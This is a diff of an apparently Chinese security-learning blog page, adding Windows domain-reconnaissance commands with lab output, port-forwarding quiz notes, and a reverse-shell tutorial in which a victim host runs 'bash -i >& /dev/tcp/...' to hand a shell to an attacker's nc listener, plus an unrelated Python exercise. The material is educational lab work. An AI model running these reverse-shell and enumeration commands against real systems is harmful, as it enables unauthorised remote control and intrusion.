@@ -173,15 +173,9 @@
 <h3 id="2-2查询当前权限"><a href="#2-2查询当前权限" class="headerlink" title="2.2查询当前权限"></a><strong>2.2查询当前权限</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami <span class="comment">#查看当前权限</span></span><br><span class="line">whoami /all <span class="comment">#获取域SID</span></span><br><span class="line">net user 用户名 /domain   <span class="comment">#获取指定用户的账户信息</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="2-3判断是否存在域"><a href="#2-3判断是否存在域" class="headerlink" title="2.3判断是否存在域"></a><strong>2.3判断是否存在域</strong></h3><p>获得了本机的相关信息后，就要判断当前内网中是否存在域。<strong>如果当前内网中存在域，就需要判断所控主机是否在域内</strong></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看本机是否和DNS服务器处于同一网段</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; ipconfig /all</span><br><span class="line">Windows IP 配置</span><br><span class="line">   主机名  . . . . . . . . . . . . . : stu1</span><br><span class="line">   主 DNS 后缀 . . . . . . . . . . . : god.org</span><br><span class="line">   节点类型  . . . . . . . . . . . . : 混合</span><br><span class="line">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class="line">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class="line">   DNS 后缀搜索列表  . . . . . . . . : god.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断域控制服务器是否和DNS服务器在同一台服务器上</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; nslookup god.org</span><br><span class="line">非权威应答:</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">126.2</span></span><br><span class="line">名称:    god.org</span><br><span class="line">Addresses:  <span class="number">23.253</span>.<span class="number">58.227</span></span><br><span class="line">      <span class="number">176.34</span>.<span class="number">241.253</span></span><br><span class="line">      <span class="number">162.242</span>.<span class="number">150.89</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看域名、登录服务器为域控制器   如果域为WORKGROUP 表示当前服务器不在域内</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; systeminfo</span><br><span class="line">虚拟内存: 可用:   <span class="number">2</span>,<span class="number">765</span> MB</span><br><span class="line">虚拟内存: 使用中: <span class="number">1</span>,<span class="number">330</span> MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               god.org</span><br><span class="line">登录服务器:       \\OWA</span><br><span class="line"></span><br><span class="line">net config Workstation  <span class="comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\phpStudy\WWW\yxcms&gt; net config Workstation</span><br><span class="line">计算机名                     \\STU1</span><br><span class="line">计算机全名                   stu1.god.org</span><br><span class="line">用户名                       Administrator</span><br><span class="line">工作站正运行于               </span><br><span class="line">    NetBT_Tcpip_&#123;<span class="number">4</span>DAEBDFD<span class="literal">-0177</span><span class="literal">-4691</span><span class="literal">-8243</span><span class="literal">-B73297E2F0FF</span>&#125; (<span class="number">000</span>C29ADED06)</span><br><span class="line">    NetBT_Tcpip_&#123;<span class="number">55</span>ECD929<span class="literal">-FBB2</span><span class="literal">-4D96</span><span class="literal">-B43D</span><span class="literal">-8FFEB14A169F</span>&#125; (<span class="number">000</span>C29ADED10)</span><br><span class="line">    NetBT_Tcpip_&#123;EC57C4EB<span class="literal">-763E</span><span class="literal">-4000</span><span class="literal">-9CDE</span><span class="literal">-4D7FF15DF74C</span>&#125; (<span class="number">02004</span>C4F4F50)</span><br><span class="line">软件版本                     Windows <span class="number">7</span> Professional</span><br><span class="line">工作站域                     GOD</span><br><span class="line">工作站域 DNS 名称            god.org</span><br><span class="line">登录域                       GOD</span><br><span class="line">COM 打开超时 (秒)            <span class="number">0</span></span><br><span class="line">COM 发送计数 (字节)          <span class="number">16</span></span><br><span class="line">COM 发送超时 (毫秒)          <span class="number">250</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看本机是否和DNS服务器处于同一网段</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; ipconfig /all</span><br><span class="line">Windows IP 配置</span><br><span class="line">   主机名  . . . . . . . . . . . . . : stu1</span><br><span class="line">   主 DNS 后缀 . . . . . . . . . . . : god.org</span><br><span class="line">   节点类型  . . . . . . . . . . . . : 混合</span><br><span class="line">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class="line">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class="line">   DNS 后缀搜索列表  . . . . . . . . : god.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断域控制服务器是否和DNS服务器在同一台服务器上</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; nslookup god.org</span><br><span class="line">非权威应答:</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">126.2</span></span><br><span class="line">名称:    god.org</span><br><span class="line">Addresses:  <span class="number">23.253</span>.<span class="number">58.227</span></span><br><span class="line">      <span class="number">176.34</span>.<span class="number">241.253</span></span><br><span class="line">      <span class="number">162.242</span>.<span class="number">150.89</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看域名、登录服务器为域控制器   如果域为WORKGROUP 表示当前服务器不在域内</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; systeminfo</span><br><span class="line">虚拟内存: 可用:   <span class="number">2</span>,<span class="number">765</span> MB</span><br><span class="line">虚拟内存: 使用中: <span class="number">1</span>,<span class="number">330</span> MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               god.org</span><br><span class="line">登录服务器:       \\OWA</span><br><span class="line"></span><br><span class="line">net config Workstation  <span class="comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询当前登录域及登录用户信息</span></span><br><span class="line">C:\phpStudy\WWW\yxcms&gt; net config Workstation</span><br><span class="line">计算机名                     \\STU1</span><br><span class="line">计算机全名                   stu1.god.org</span><br><span class="line">用户名                       Administrator</span><br><span class="line">工作站域                     GOD</span><br><span class="line">工作站域 DNS 名称            god.org  <span class="comment">###当前登录域名</span></span><br><span class="line">登录域                       GOD   <span class="comment">#此处表示当前用户是域用户还是本地，，这里表示域用户</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断主域</span></span><br><span class="line">net time /domain        <span class="comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span></span><br><span class="line">通常有三种情况：</span><br><span class="line">存在域，但当前用户不是域用户----拒绝访问</span><br><span class="line">存在域，且是--<span class="literal">-xx</span>的当前时间是xxx</span><br><span class="line">当前网络环境是工作组----找不到域xx的域控制器</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net time /domain        <span class="comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span></span><br><span class="line">net user /domain        <span class="comment">#查看域用户</span></span><br><span class="line">net view /domain        <span class="comment">#查看有几个域</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain   <span class="comment">#查看域内所有的主机名 </span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain      <span class="comment">#查看域管理员 </span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain <span class="comment">#查看域控</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group /domain                      <span class="comment">#查询域里面的工作组 </span></span><br><span class="line">net group 组名 /domain                  <span class="comment">#查询域中的某工作组</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-4探测域内存活主机"><a href="#2-4探测域内存活主机" class="headerlink" title="2.4探测域内存活主机"></a><strong>2.4探测域内存活主机</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user /domain        <span class="comment">#查看域用户</span></span><br><span class="line">net view /domain        <span class="comment">#查看有几个域</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain   <span class="comment">#查看域内所有的主机名 </span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain      <span class="comment">#查看域管理员 </span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain <span class="comment">#查看域控</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group /domain                      <span class="comment">#查询域里面的工作组 </span></span><br><span class="line">net group 组名 /domain                  <span class="comment">#查询域中的某工作组</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -396,8 +390,8 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2020/04/21/web%E5%9F%BA%E7%A1%80/"
-    >web基础</a
+  <a class="article-title" href="/2020/04/12/web%E5%9F%BA%E7%A1%80/"
+    >web杂烩</a
   >
 </h2>
   
@@ -407,8 +401,8 @@
 
     
     <div class="article-meta">
-      <a href="/2020/04/21/web%E5%9F%BA%E7%A1%80/" class="article-date">
-  <time datetime="2020-04-21T14:25:31.000Z" itemprop="datePublished">2020-04-21</time>
+      <a href="/2020/04/12/web%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2020-04-12T14:25:31.000Z" itemprop="datePublished">2020-04-12</time>
 </a>
       
       
@@ -427,7 +421,162 @@
       
 
       
+      <p>以下工具或命令不能实现端口转发是（）</p>
+<p>端口转发（Port forwarding）是安全壳(SSH)  为网络安全通信使用的一种方法。SSH可以利用端口转发技术来传输其他TCP/IP协议的报文，当使用这种方式时，SSH就为其他服务在客户端和服务器端建立了一条安全的传输管道。端口转发利用本客户机端口映射到服务器端口来工作，SSH可以映射所有的服务器端口到本地端口，但要设置1024以下的端口需要根用户权限。在使用防火墙的网络中，如果设置为允许SSH服务通过(开启了22端口)，而阻断了其他服务，则被阻断的服务仍然可以通过端口转发技术转发数据包</p>
+<p>ssh可以实现本地端口转发,远程端口转发,动态端口转发。  <a href="https://www.cnblogs.com/keerya/articles/7612715.html" target="_blank" rel="noopener">https://www.cnblogs.com/keerya/articles/7612715.html</a>     netsh端口转发:  <a href="https://www.jianshu.com/p/3b108844729e" target="_blank" rel="noopener">https://www.jianshu.com/p/3b108844729e</a>  </p>
+<p>htran端口转发:  <a href="https://cloud.tencent.com/developer/article/1365274" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1365274</a>   </p>
+<p>MSBuild: MSBuild 是 Microsoft 和 Visual Studio的生成系统。可以用来绕过AppLocker  <a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5</a>   </p>
+<p>更多端口转发工具  <a href="http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4" target="_blank" rel="noopener">http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4</a>   <a href="https://www.freebuf.com/articles/web/170970.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/170970.html</a></p>
+<hr>
+<p>php://phar是用来读取phar文件的 phar文件在使用特定的函数时会触发反序列化漏洞具体利用方法 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
+<h2 id="反弹shell原理与实现"><a href="#反弹shell原理与实现" class="headerlink" title="反弹shell原理与实现"></a><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html" target="_blank" rel="noopener">反弹shell原理与实现</a></h2><p><strong>什么是反弹shell？</strong></p>
+<p>　　反弹shell（reverse  shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse  shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<p><strong>为什么要反弹shell？</strong></p>
+<p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
+<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
+<p>有如下情况：</p>
+<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 </p>
+<p>2.目标机器的ip动态改变，你不能持续控制。</p>
+<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
+<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+<p>==============================================================</p>
+<p><strong>反弹shell实验</strong></p>
+<p>环境：两台CentOS7.6服务器</p>
+<ul>
+<li>攻击端 hacker：10.201.61.194 </li>
+<li>受害端 victim：10.201.61.195 </li>
+</ul>
+<p>\1. 攻击端监听一个端口：</p>
+<p>[root@hacker ~]# <strong>nc -lvp 6767</strong></p>
+<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
+<p><em>Ncat: Listening on :::6767</em></p>
+<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
+<p>2.受害端生成一个反弹shell：</p>
+<p>[root@victim ~]# <strong>bash -i &gt;&amp; /dev/tcp/10.201.61.194/6767 0&gt;&amp;1</strong></p>
+<p>3.攻击端已获取到受害端的bash：</p>
+<p>[root@hacker ~]# nc -lvp 6767</p>
+<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
+<p><em>Ncat: Listening on :::6767</em></p>
+<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
+<p><em>Ncat: Connection from 10.201.61.195.</em></p>
+<p><em>Ncat: Connection from 10.201.61.195:46836.</em></p>
+<p>[root@victim ~]#     //攻击端已获得受害端的远程交互式shell</p>
+<p>[root@victim ~]# hostname</p>
+<p>hostname</p>
+<p>victim</p>
+<p><strong>解释：</strong></p>
+<p>\1. nc -lvp 6767</p>
+<p> -l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
+<p>\2. bash -i</p>
+<p>-i interactive。即产生一个交互式的shell（bash）。</p>
+<p>\3. /dev/tcp/IP/PORT </p>
+<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 <code>bash</code> 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
+<p><strong>通过以下4个小测试来分析反弹shell实现过程：</strong></p>
+<p>（PS: 注意执行步骤顺序）</p>
+<p><strong>测试1：</strong></p>
+<p>受害端：</p>
+<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //第三步<br>[root@victim ~]# </p>
+<p>攻击端：</p>
+<p>[root@hacker ~]# nc -lvp 5566   //第一步</p>
+<p>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:49018.</p>
+<p>victim   //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</p>
+<p><strong>测试2：</strong></p>
+<p>受害端：</p>
+<p>[root@victim ~]# bash -i &lt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。<br>victim</p>
+<p> 攻击端：</p>
+<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:50412.<br>hostname    //第三步（攻击端执行命令）</p>
+<p><strong>测试3</strong>：</p>
+<p>受害端：</p>
+<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1    //第二步<br>[root@victim ~]# hostname    //受害端回显命令<br>[root@victim ~]# id    //受害端回显命令<br>[root@victim ~]# hahaha    //受害端回显命令<br>bash: hahaha: command not found    //受害端回显命令。显示错误命令的输出。<br>[root@victim ~]# </p>
+<p> 攻击端：</p>
+<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:36792.<br>hostname    //第三步（攻击端执行命令）<br>victim<br>id    //第四步（攻击端执行命令）<br>uid=0(root) gid=0(root) groups=0(root)<br>hahaha    //第五步（执行一个错误的命令）</p>
+<p>//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。</p>
+<p> <strong>测试4</strong>（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）： </p>
+<p>受害端：</p>
+<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 2&gt;&amp;1    //第二步。或 # bash -i &amp;&gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 （注：&amp;&gt;或&gt;&amp; 表示混合输出，即标准输出1 + 错误输出2）</p>
+<p>攻击端：</p>
+<p>[root@hacker <del>]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:51182.<br>[root@victim ~]# hostname    //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令</del><br>hostname<br>victim</p>
+<p>//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用<del>~</del></p>
+
       
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+    <footer class="article-footer">
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a></li></ul>
+
+
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-python编程" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/04/06/python%E7%BC%96%E7%A8%8B/"
+    >python编程</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/04/06/python%E7%BC%96%E7%A8%8B/" class="article-date">
+  <time datetime="2020-04-06T04:51:43.000Z" itemprop="datePublished">2020-04-06</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <p>  1.众所周知，牛妹有很多很多粉丝，粉丝送了很多很多礼物给牛妹，牛妹的礼物摆满了地板。 </p>
+<p>  地板是N×MN\times MN×M的格子，每个格子有且只有一个礼物，牛妹已知每个礼物的体积。 </p>
+<p>  地板的坐标是左上角(1,1) 右下角（N, M）。 </p>
+<p>  牛妹只想要从屋子左上角走到右下角，每次走一步，每步只能向下走一步或者向右走一步或者向右下走一步 </p>
+<p>  每次走过一个格子，拿起（并且必须拿上）这个格子上的礼物。 </p>
+<p>  牛妹想知道，她能走到最后拿起的所有礼物体积最小和是多少？ </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selectPresent</span><span class="params">(self ,presentVolumn)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> presentVolumn:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        N=len(presentVolumn)</span><br><span class="line">        M=len(presentVolumn[<span class="number">0</span>])</span><br><span class="line">        print(N)</span><br><span class="line">        print(M)</span><br><span class="line">        dp=[[<span class="number">0</span>]*M <span class="keyword">for</span> _ <span class="keyword">in</span> range(N)]</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=presentVolumn[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            dp[i][<span class="number">0</span>]=dp[i<span class="number">-1</span>][<span class="number">0</span>]+presentVolumn[i][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">            dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i<span class="number">-1</span>]+presentVolumn[<span class="number">0</span>][i]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">                dp[i][j]=min(dp[i<span class="number">-1</span>][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>])+presentVolumn[i][j]</span><br><span class="line">        <span class="keyword">return</span> dp[i][j]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = int(input()) <span class="comment">#// 输入二维数组的行数和列数</span></span><br><span class="line">    line = [[<span class="number">0</span>] * n] * n <span class="comment">#// 初始化二维数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        line[i] = input().split(<span class="string">" "</span>) <span class="comment">#输入二维数组，同行数字用空格分隔，不同行则用回车换行</span></span><br><span class="line">        line[i] = [int(j) <span class="keyword">for</span> j <span class="keyword">in</span> line[i]]<span class="comment"># // 将数组中的每一行转换成整型</span></span><br><span class="line">    print(line) <span class="comment">#// 打印二维数组1</span></span><br><span class="line">    print(Solution().selectPresent(line))</span><br><span class="line"><span class="comment">#[[1,2,3],[2,3,4]]</span></span><br></pre></td></tr></table></figure>
+
+
+
+
       
       <!-- reward -->
       
@@ -1791,101 +1940,14 @@
 
 </article>
     
-    <article id="post-简单搭建个属于你的个人博客" class="article article-type-post" itemscope
-  itemprop="blogPost" data-scroll-reveal>
-
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
-    >简单搭建个属于你的个人博客</a
-  >
-</h2>
-  
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" class="article-date">
-  <time datetime="2020-02-18T14:44:57.000Z" itemprop="datePublished">2020-02-18</time>
-</a>
-      
-      
-      
-      
-    </div>
-    
-
-    
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <hr>
-<p>没想到都大三老狗了，还是个新人的水准，这就是菜吧。但还是要努力学习呀，希望有个好的结果！</p>
-<p>废话不多说，开始小白的搭建博客教程吧~</p>
-<h4 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h4><p><a href="https://git-scm.com/downloads" target="_blank" rel="noopener">git官网传送门</a></p>
-<h4 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h4><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js官网传送门</a></p>
-<h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>Hexo拥有丰富的主题，比较推荐</p>
-<p>win+R  cmd 输入以下命令，安装hexo包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-建立博客所在文件"><a href="#4-建立博客所在文件" class="headerlink" title="4.建立博客所在文件"></a>4.建立博客所在文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init chj</span><br><span class="line">cd chj</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
-
-<p>过程如下图：</p>
-<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" alt="1234"></p>
-<p>文件下的目录如下：</p>
